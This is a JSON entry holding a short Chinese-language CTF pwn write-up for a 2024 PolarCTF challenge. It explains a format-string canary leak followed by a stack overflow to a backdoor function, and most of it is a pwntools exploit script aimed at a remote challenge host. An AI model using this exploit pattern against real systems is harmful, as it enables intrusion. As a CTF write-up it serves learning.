[{"content":"chunk1 题目分析： 从vuln函数可看出，存在两次格式化字符串漏洞，并且两次读取都存在溢出。 题目给出了后门函数\n同时本题的canary保护开启、PIE保护关闭，因此可以利用第一次格式化字符串，泄露canary值，第二次直接通过溢出覆盖vuln函数返回地址为后门函数地址即可。\nExp： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from pwn import * from LibcSearcher import * from ctypes import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) filename = \u0026#39;./pwn\u0026#39; #io = process(filename) io = remote(\u0026#34;120.46.59.242\u0026#34;,2106) elf = ELF(filename) libc = elf.libc def debug(): #gdb.attach(io,\u0026#34;b *$rebase(0xc99)\u0026#34;) gdb.attach(io) backdoor = 0x080485F1 #debug() # 泄露canary payload = b\u0026#39;%31$p\u0026#39; io.send(payload) sleep(0.5) canary = int(io.recv(10),16) print(\u0026#34;canary:\u0026#34; + hex(canary)) # 覆盖ret为backdoor payload = flat([cyclic(0x70-0xc),canary,cyclic(0xc),backdoor]) io.send(payload) io.interactive() ","date":"2020-09-21T00:00:00Z","permalink":"https://zz-zz-955.github.io/hugo-dev/p/test-chinese/","title":"2024PolarCTF秋季个人挑战赛-pwn-wp"}]